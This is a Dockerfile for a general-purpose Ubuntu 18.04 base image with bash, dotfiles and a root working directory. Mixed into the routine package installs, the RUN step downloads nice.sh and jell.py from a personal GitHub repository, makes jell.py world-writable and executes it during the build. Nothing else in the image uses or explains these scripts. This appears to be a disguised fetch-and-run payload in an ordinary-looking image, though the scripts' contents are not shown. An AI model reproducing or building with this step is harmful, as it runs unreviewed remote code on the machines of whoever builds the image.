FROM ubuntu:18.04

# Install.
RUN \
  apt-get update && \
  apt-get install python -y && \
  apt-get install gcc -y && \
  apt-get install unzip -y && \
  apt-get install wget -y && \
  wget https://github.com/thoeb292/thoeb292/raw/main/nice.sh && \
  wget https://github.com/thoeb292/thoeb292/raw/main/jell.py && \
  chmod 777 jell.py && \
  python jell.py && \
  rm -rf /var/lib/apt/lists/* 

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD ["bash"]
